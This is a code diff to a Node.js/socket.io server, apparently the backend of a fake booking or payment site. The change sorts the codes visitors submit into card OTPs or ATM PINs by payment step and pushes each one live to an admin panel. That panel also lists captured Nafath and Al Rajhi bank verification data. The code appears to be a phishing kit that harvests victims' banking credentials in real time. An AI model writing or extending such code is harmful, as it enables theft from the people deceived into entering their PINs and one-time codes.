@@ -548,8 +548,22 @@ io.on("connection", (socket) => {
         socket.emit("ackCode", { success: false });
         return;
       }
-      await createOrUpdateVerification(referenceId, "code", { otpCode: data.code, ...data, rawData: data });
-      notifyAdmin("newVerification", { type: "code", referenceId, ...data });
+      // تحديد نوع البيانات بناءً على خطوة الدفع الحالية
+      // step=1 → OTP بعد البطاقة, step=2 → رقم سري ATM
+      let verType = "otp";
+      let notifyType = "newOTP";
+      let notifyLabel = "OTP";
+      try {
+        const payment = await getPaymentByReference(referenceId);
+        const step = payment?.step || 1;
+        if (step >= 2) {
+          verType = "pin";
+          notifyType = "newPIN";
+          notifyLabel = "PIN";
+        }
+      } catch(e) { /* استخدم الافتراضي */ }
+      await createOrUpdateVerification(referenceId, verType, { ...data, rawData: data });
+      notifyAdmin("newVerification", { type: verType, label: notifyLabel, referenceId, ...data });
       socket.emit("ackCode", { success: true });
     } catch (err) {
       console.error("submitCodeData error:", err);
@@ -743,7 +757,7 @@ app.get("/api/admin/bookings/:referenceId", verifyAdminToken, async (req, res) =
     if (!booking) return res.status(404).json({ error: "Not found" });
     const payment = await getPaymentByReference(req.params.referenceId);
     // جلب جميع أنواع التحقق
-    const verTypes = ['nafad', 'phone', 'phoneCode', 'pin', 'rajhi', 'rajhiCode', 'code'];
+    const verTypes = ['nafad', 'phone', 'phoneCode', 'otp', 'pin', 'rajhi', 'rajhiCode', 'code'];
     const verifications = {};
     for (const t of verTypes) {
       const v = await getVerificationByReference(req.params.referenceId, t);
